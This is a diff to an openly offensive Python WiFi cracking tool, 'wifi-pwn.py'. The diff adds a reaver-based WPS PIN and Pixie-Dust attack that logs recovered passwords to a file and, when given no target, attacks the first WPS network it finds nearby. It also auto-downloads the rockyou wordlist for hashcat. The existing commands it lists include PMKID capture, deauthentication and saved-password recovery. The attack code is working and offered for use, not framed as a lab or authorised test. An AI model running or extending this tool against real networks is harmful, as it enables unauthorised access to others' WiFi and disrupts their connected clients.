@@ -125,6 +125,8 @@ def install_missing_tools():
         "airodump-ng": "aircrack-ng",
         "aireplay-ng": "aircrack-ng",
         "airmon-ng": "aircrack-ng",
+        "reaver": "reaver",
+        "wash": "reaver",
         "iw": "iw",
         "ethtool": "ethtool",
     }
@@ -441,14 +443,50 @@ def crack_hashcat(hash_file, wordlist=None, mask=None, rules=None, timeout=300):
         for c in candidates:
             if Path(c).exists():
                 wordlist = c
+                if c.endswith(".gz"):
+                    import gzip
+                    wordlist = str(Path(c).with_suffix(""))
+                    with gzip.open(c, 'rb') as f_in:
+                        with open(wordlist, 'wb') as f_out:
+                            f_out.write(f_in.read())
                 break
         
         if not wordlist:
-            log("No wordlist found. Downloading rockyou.txt...", "warn")
-            wordlist = str(OUTPUT_DIR / "rockyou.txt")
-            if not Path(wordlist).exists():
-                log("Download: curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", "info")
-                log("Then re-run with --wordlist rockyou.txt", "info")
+            log("No wordlist found. Trying to download rockyou.txt...", "warn")
+            dl_dir = SCRIPT_DIR / "wordlists"
+            dl_dir.mkdir(parents=True, exist_ok=True)
+            dl_path = dl_dir / "rockyou.txt"
+            
+            urls = [
+                ("https://raw.githubusercontent.com/brannondorsey/naive-hashcat/master/rockyou.txt", "curl"),
+                ("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt", "curl"),
+            ]
+            
+            downloaded = False
+            for url, tool in urls:
+                if check_tool(tool):
+                    log(f"Downloading {url}...", "info")
+                    code, out, err = run_cmd([tool, "-L", "-o", str(dl_path), url], timeout=120)
+                    if code == 0 and dl_path.exists() and dl_path.stat().st_size > 1000:
+                        downloaded = True
+                        break
+                else:
+                    try:
+                        import urllib.request
+                        log(f"Downloading {url}...", "info")
+                        urllib.request.urlretrieve(url, str(dl_path))
+                        if dl_path.exists() and dl_path.stat().st_size > 1000:
+                            downloaded = True
+                            break
+                    except Exception as e:
+                        log(f"Download failed: {e}", "warn")
+            
+            if downloaded:
+                wordlist = str(dl_path)
+                log(f"Downloaded wordlist to {dl_path}", "ok")
+            else:
+                log("Could not download any wordlist automatically.", "error")
+                log("Please download rockyou.txt manually and place it in the wordlists/ folder.", "info")
                 return None
     
     potfile = str(OUTPUT_DIR / "hashcat.potfile")
@@ -456,6 +494,7 @@ def crack_hashcat(hash_file, wordlist=None, mask=None, rules=None, timeout=300):
     cmd = ["hashcat", "-m", "22000", "-a", "0", 
            "--potfile-path", potfile,
            "--status", "--status-timer", "5",
+           "--exit",
            hash_file, wordlist]
     
     if rules and Path(rules).exists():
@@ -465,6 +504,7 @@ def crack_hashcat(hash_file, wordlist=None, mask=None, rules=None, timeout=300):
         cmd = ["hashcat", "-m", "22000", "-a", "3",
                "--potfile-path", potfile,
                "--status", "--status-timer", "5",
+               "--exit",
                hash_file, mask]
     
     log(f"Starting hashcat...")
@@ -663,15 +703,207 @@ def send_deauth(bssid, client_mac=None, count=5, iface=None):
         log(f"Deauth failed. Internal card may not support injection.", "warn")
         return False
 
+# ─── PHASE 5b: WPS Attack ───
+
+def scan_wps():
+    if not check_tool("wash"):
+        log("wash not found. Install: sudo apt install reaver", "error")
+        return None
+    
+    code, out, err = run_cmd(["iw", "dev"])
+    ifaces = re.findall(r'Interface\s+(\w+)', out) if code == 0 else []
+    if not ifaces:
+        log("No wireless interfaces found.", "error")
+        return None
+    
+    iface = ifaces[0]
+    log("Scanning for WPS-enabled networks...", "info")
+    log(f"Using interface: {iface}", "info")
+    code, out, err = run_cmd(["sudo", "wash", "-i", iface], timeout=15)
+    
+    if code != 0:
+        log("WPS scan failed. Ensure monitor mode is enabled.", "error")
+        return None
+    
+    lines = out.splitlines()
+    networks = []
+    for line in lines:
+        if line.startswith("BSSID") or ":" not in line:
+            continue
+        parts = line.split()
+        if len(parts) >= 5:
+            bssid = parts[0]
+            ch = "?"
+            for p in parts:
+                if p.isdigit():
+                    ch = p
+                    break
+            ssid = "WPS-Network"
+            lock = "No"
+            for i, p in enumerate(parts):
+                if p in ["Locked", "Unlocked"] and i > 0:
+                    lock = p
+            networks.append((bssid, ch, lock, ssid))
+    
+    if not networks:
+        print(f"  {Y}No WPS-enabled networks found.{N}")
+        return None
+    
+    print(f"\n{B}{'BSSID':20} {'CH':4} {'Lock':8}{N}")
+    print("-" * 35)
+    for bssid, ch, lock, ssid in networks:
+        print(f"  {bssid:20} {ch:4} {lock:8}")
+    
+    return networks
+
+def attack_wps(bssid, channel=None, pixie=False, iface=None):
+    if not check_tool("reaver"):
+        log("reaver not found. Install: sudo apt install reaver", "error")
+        return None
+    
+    if not iface:
+        code, out, _ = run_cmd(["iw", "dev"])
+        ifaces = re.findall(r'Interface\s+(\w+)', out)
+        if not ifaces:
+            log("No wireless interfaces found.", "error")
+            return None
+        iface = ifaces[0]
+    
+    log(f"Starting WPS attack on {bssid} via {iface}...", "info")
+    if pixie:
+        log("Mode: Pixie-Dust attack (bruteforces the WPS PIN offline)", "info")
+    else:
+        log("Mode: Online PIN brute-force (may take hours)", "warn")
+    
+    cmd = ["sudo", "reaver", "-i", iface, "-b", bssid, "-vv"]
+    if channel:
+        cmd.extend(["-c", str(channel)])
+    if pixie:
+        cmd.append("-K")
+    
+    cmd.extend(["--timeout", "30", "--max-attempts", "50"])
+    
+    stop_spinner = threading.Event()
+    spinner_thread = threading.Thread(target=spinner, args=(stop_spinner, f"WPS attack on {bssid}"))
+    spinner_thread.start()
+    
+    try:
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        
+        psk = None
+        pin = None
+        
+        start_time = time.time()
+        while time.time() - start_time < 1800 and not STOP_FLAG:
+            try:
+                line = proc.stdout.readline()
+                if not line:
+                    break
+                line = line.strip()
+                if "WPA PSK" in line or "PSK" in line:
+                    print(f"  {G}{line}{N}")
+                    m = re.search(r'PSK[:\s]+"([^"]+)"', line)
+                    if m:
+                        psk = m.group(1)
+                elif "PIN" in line:
+                    print(f"  {C}{line}{N}")
+                    m = re.search(r'PIN[:\s]+(\d+)', line)
+                    if m:
+                        pin = m.group(1)
+                elif "error" in line.lower() or "fail" in line.lower():
+                    print(f"  {R}{line}{N}")
+                elif line and not line.startswith("[") and len(line) > 3:
+                    print(f"  {line}")
+            except:
+                break
+        
+        stop_spinner.set()
+        spinner_thread.join()
+        
+        if not STOP_FLAG:
+            proc.terminate()
+            try:
+                proc.wait(timeout=5)
+            except:
+                proc.kill()
+        
+        if psk:
+            elapsed = time.time() - start_time
+            log(f"WPS PSK FOUND: {G}{BOLD}{psk}{N}", "ok")
+            if pin:
+                log(f"WPS PIN: {pin}", "ok")
+            log(f"Time: {elapsed:.1f}s", "ok")
+            write_report(ssid="WPS", bssid=bssid, method=f"WPS ({'Pixie-Dust' if pixie else 'PIN'})", status="CRACKED", password=psk, elapsed=elapsed)
+            pwd_file = OUTPUT_DIR / "cracked-passwords.txt"
+            with open(pwd_file, "a") as f:
+                f.write(f"{bssid}:{psk}\n")
+            return psk
+        else:
+            log("WPS attack did not recover the password. The router may have WPS lockout enabled.", "warn")
+            return None
+    except Exception as e:
+        stop_spinner.set()
+        spinner_thread.join()
+        log(f"WPS attack error: {e}", "error")
+        return None
+
 # ─── PHASE 6: Auto Scan ───
 
-def scan_networks(iface=None):
+def scan_networks(iface=None, json_output=False):
     if IS_WINDOWS:
         log("Scanning networks on Windows...", "info")
         code, out, err = run_cmd(["netsh", "wlan", "show", "networks", "mode=Bssid"])
         if code == 0:
-            print(f"\n{C}{out}{N}")
-            return out
+            networks = []
+            current = {}
+            
+            for line in out.splitlines():
+                m = re.match(r'\s*SSID\s*\d*\s*:\s*(.*)', line)
+                if m:
+                    if current and "ssid" in current:
+                        networks.append(current)
+                    current = {"ssid": m.group(1).strip()}
+                    continue
+                
+                m = re.match(r'\s*BSSID\s*\d*\s*:\s*([0-9a-f:]+)', line, re.IGNORECASE)
+                if m:
+                    current["bssid"] = m.group(1).lower()
+                    continue
+                
+                m = re.match(r'\s*Signal\s*:\s*(.*)', line, re.IGNORECASE)
+                if m:
+                    current["signal"] = m.group(1).strip()
+                    continue
+                
+                m = re.match(r'\s*Channel\s*:\s*(\d+)', line, re.IGNORECASE)
+                if m:
+                    current["channel"] = m.group(1)
+                    continue
+                
+                m = re.match(r'\s*Authentication\s*:\s*(.*)', line, re.IGNORECASE)
+                if m:
+                    current["auth"] = m.group(1).strip()
+                    continue
+            
+            if current and "ssid" in current:
+                networks.append(current)
+            
+            if json_output:
+                print(json.dumps({"platform": "windows", "networks": networks}, indent=2))
+            else:
+                print(f"\n{B}{'SSID':30} {'BSSID':20} {'CH':5} {'Signal':8} {'Auth':20}{N}")
+                print("-" * 80)
+                seen = set()
+                for net in networks:
+                    bssid = net.get("bssid", "??")
+                    if bssid not in seen:
+                        seen.add(bssid)
+                        ssid = net.get("ssid", "[Hidden]")
+                        ch = net.get("channel", "?")
+                        sig = net.get("signal", "?")
+                        auth = net.get("auth", "?")
+                        print(f"  {ssid:30} {bssid:20} {ch:5} {sig:8} {auth:20}")
+            return networks
         return None
     
     if not iface:
@@ -689,18 +921,29 @@ def scan_networks(iface=None):
         bssids = re.findall(r'BSS\s+([0-9a-f:]+)', out)
         ssids = re.findall(r'SSID:\s+(.*?)\n', out)
         channels = re.findall(r'DS\s+Parameter set: channel (\d+)', out)
+        signals = re.findall(r'signal:\s*([-\d.]+)\s*dBm', out)
+        auths = re.findall(rb'Authentication:\s*([^\s]+)', out.encode('utf-8', errors='ignore'))
         
-        print(f"\n{B}{'SSID':30} {'BSSID':20} {'CH':5}{N}")
-        print("-" * 55)
+        networks = []
         seen = set()
         for i, bssid in enumerate(bssids):
             if bssid not in seen:
                 seen.add(bssid)
                 ssid = ssids[i] if i < len(ssids) else "[Hidden]"
                 ch = channels[i] if i < len(channels) else "?"
-                print(f"  {ssid:30} {bssid:20} {ch:5}")
+                sig = signals[i] if i < len(signals) else "?"
+                auth = auths[i].decode('utf-8', errors='ignore') if i < len(auths) else "?"
+                networks.append({"ssid": ssid.strip(), "bssid": bssid, "channel": ch, "signal": sig + " dBm", "auth": auth})
         
-        return True
+        if json_output:
+            print(json.dumps({"platform": "linux", "interface": iface, "networks": networks}, indent=2))
+        else:
+            print(f"\n{B}{'SSID':30} {'BSSID':20} {'CH':5} {'Signal':10} {'Auth':15}{N}")
+            print("-" * 85)
+            for net in networks:
+                print(f"  {net['ssid']:30} {net['bssid']:20} {net['channel']:5} {net['signal']:10} {net['auth']:15}")
+        
+        return networks
     
     code, out, err = run_cmd(["sudo", "iwlist", iface, "scan"], timeout=15)
     if code == 0:
@@ -789,6 +1032,8 @@ Examples:
   python wifi-pwn.py pmkid --bssid AA:BB:CC:DD:EE:FF --timeout 120
   python wifi-pwn.py capture --bssid AA:BB:CC:DD:EE:FF --channel 6
   python wifi-pwn.py deauth --bssid AA:BB:CC:DD:EE:FF --iface wlan0mon
+  python wifi-pwn.py wps --bssid AA:BB:CC:DD:EE:FF
+  python wifi-pwn.py wps --bssid AA:BB:CC:DD:EE:FF --pixie
   python wifi-pwn.py crack --input hash.22000 --wordlist rockyou.txt
   python wifi-pwn.py full --bssid AA:BB:CC:DD:EE:FF
   python wifi-pwn.py detect
@@ -796,10 +1041,10 @@ Examples:
     )
     
     parser.add_argument("command", nargs="?", default="help",
-                        help="Command: recon, scan, pmkid, capture, deauth, crack, full, detect")
+                        help="Command: recon, scan, pmkid, capture, deauth, wps, crack, full, detect")
     parser.add_argument("--bssid", help="Target BSSID (MAC address)")
     parser.add_argument("--channel", type=int, help="Target channel")
-    parser.add_argument("--timeout", type=int, default=60, help="Capture timeout in seconds (default: 60)")
+    parser.add_argument("--timeout", type=int, default=3600, help="Capture timeout in seconds (default: 3600)")
     parser.add_argument("--interface", help="Wireless interface name")
     parser.add_argument("--input", help="Input hash/capture file for cracking")
     parser.add_argument("--wordlist", help="Path to wordlist")
@@ -807,7 +1052,9 @@ Examples:
     parser.add_argument("--rules", help="Hashcat rules file")
     parser.add_argument("--client", help="Client MAC for targeted deauth")
     parser.add_argument("--count", type=int, default=5, help="Number of deauth packets")
+    parser.add_argument("--pixie", action="store_true", help="Use Pixie-Dust attack for WPS (faster)")
     parser.add_argument("--output", help="Output directory")
+    parser.add_argument("--json", action="store_true", help="Output scan results as JSON")
     parser.add_argument("--no-admin", action="store_true", help="Skip admin check")
     
     args = parser.parse_args()
@@ -831,6 +1078,12 @@ Examples:
     
     cmd = args.command.lower()
     
+    WINDOWS_UNSUPPORTED = ["pmkid", "capture", "deauth", "full", "wps"]
+    if IS_WINDOWS and cmd in WINDOWS_UNSUPPORTED:
+        log(f"'{cmd}' is not supported on Windows. Use Kali Linux or a Linux VM with a compatible wireless adapter.", "error")
+        log("Supported on Windows: recon, scan, detect, crack", "info")
+        return
+    
     if cmd == "recon":
         log("PHASE 1: Saved WiFi Password Recovery", "info")
         if IS_WINDOWS:
@@ -839,7 +1092,7 @@ Examples:
             recon_linux()
     
     elif cmd == "scan":
-        scan_networks(args.interface)
+        scan_networks(args.interface, json_output=args.json)
     
     elif cmd == "pmkid":
         log("=" * 50)
@@ -883,6 +1136,22 @@ Examples:
             log("--iface (monitor interface) is required", "error")
             return
         send_deauth(args.bssid, args.client, args.count, args.interface)
+    
+    elif cmd == "wps":
+        log("=" * 50)
+        log("WPS Attack", "info")
+        log("=" * 50)
+        
+        if args.bssid:
+            attack_wps(bssid=args.bssid, channel=args.channel, pixie=args.pixie, iface=args.interface)
+        else:
+            log("Scanning for WPS-enabled networks...", "info")
+            networks = scan_wps()
+            if networks:
+                bssid = networks[0][0]
+                ch = networks[0][1]
+                log(f"Targeting first WPS network: {bssid} (ch {ch})", "info")
+                attack_wps(bssid=bssid, channel=ch, pixie=args.pixie, iface=args.interface)
     
     elif cmd == "crack":
         if not args.input:
@@ -939,6 +1208,7 @@ Examples:
   {C}pmkid{N}      - Capture PMKID hash (WORKS ON MOST INTERNAL CARDS)
   {C}capture{N}    - Try WPA handshake capture (needs monitor mode)
   {C}deauth{N}     - Send deauth packets (needs injection support)
+  {C}wps{N}        - WPS PIN / Pixie-Dust attack (reaver)
   {C}crack{N}      - Crack a captured hash with hashcat
   {C}full{N}       - Full auto: recon -> pmkid -> crack
   {C}detect{N}     - Check what your internal WiFi adapter supports
